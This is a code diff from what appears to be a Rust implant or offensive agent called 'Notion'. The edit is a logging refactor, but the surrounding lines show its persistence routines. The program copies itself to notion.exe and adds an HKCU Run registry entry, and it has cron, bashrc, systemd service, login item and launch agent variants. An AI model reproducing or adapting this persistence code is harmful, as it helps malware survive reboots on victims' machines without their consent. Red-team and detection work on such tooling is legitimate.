@@ -10,7 +10,7 @@ use crate::cmd::{CommandArgs, shell, save, notion_out};
 #[cfg(windows)] use std::process::Command;
 #[cfg(windows)] use crate::cmd::getprivs::is_elevated;
 use crate::config::ConfigOptions;
-use crate::logger::Logger;
+use crate::logger::{Logger, log_out};
 
 
 /// Uses the specified method to establish persistence. 
@@ -50,15 +50,15 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                     let mut persist_path: String = v;
                     persist_path.push_str(r"\notion.exe");
                     let exe_path = args().nth(0).unwrap();
-                    logger.debug(format!("Current exec path: {exe_path}"));
+                    logger.debug(log_out!("Current exec path: {exe_path}"));
                     // let mut out_file = File::create(path).expect("Failed to create file");
                     fs_copy(&exe_path, &persist_path)?;
                     let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                     let path = Path::new(r"Software\Microsoft\Windows\CurrentVersion\Run");
                     let (key, disp) = hkcu.create_subkey(&path)?;
                     match disp {
-                        REG_CREATED_NEW_KEY => logger.info("A new key has been created".to_string()),
-                        REG_OPENED_EXISTING_KEY => logger.info("An existing key has been opened".to_string()),
+                        REG_CREATED_NEW_KEY => logger.info(log_out!("A new key has been created")),
+                        REG_OPENED_EXISTING_KEY => logger.info(log_out!("An existing key has been opened")),
                     };
                     key.set_value("Notion", &persist_path)?;
                     notion_out!("Persistence accomplished")
@@ -188,7 +188,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
             "cron"    => {
                 // Copy the app to a new folder
                 match create_dir(&app_dir) {
-                    Ok(_) => { logger.info("Notion directory created".to_string()); },
+                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                     Err(e) => { logger.err(e.to_string()); }
                 };
                 if let Ok(_) = copy(&app_path, dest_path) {
@@ -212,7 +212,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
             "bashrc"  => {
                 // Copy the app to a new folder
                 match create_dir(&app_dir) {
-                    Ok(_) => { logger.info("Notion directory created".to_string()); },
+                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                     Err(e) => { logger.err(e.to_string()); }
                 };
                 if let Ok(_) = copy(&app_path, dest_path) {
@@ -234,7 +234,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
             "service" => {
                 if is_root() {
                     match create_dir(&app_dir) {
-                        Ok(_) => { logger.info("Notion directory created".to_string()); },
+                        Ok(_) => { logger.info(format!("Notion directory created")); },
                         Err(e) => { logger.err(e.to_string()); }
                     };    
                     if let Ok(_) = copy(&app_path, &dest_path) {
@@ -282,7 +282,7 @@ WantedBy=multi-user.target"
             "loginitem" => {
                 // Copy the app to a new folder
                 match create_dir(&app_dir) {
-                    Ok(_) => { logger.info("Notion directory created".to_string()); },
+                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                     Err(e) => { logger.err(e.to_string()); }
                 };
                 if let Ok(_) = copy(&app_path, &dest_path) {
@@ -307,7 +307,7 @@ WantedBy=multi-user.target"
             "launchagent" => {
                 
                 match create_dir(&app_dir) {
-                    Ok(_) => { logger.info("Notion directory created".to_string()); },
+                    Ok(_) => { logger.info(log_out!("Notion directory created")); },
                     Err(e) => { logger.err(e.to_string()); }
                 };    
                 if let Ok(_) = copy(&app_path, &dest_path) {
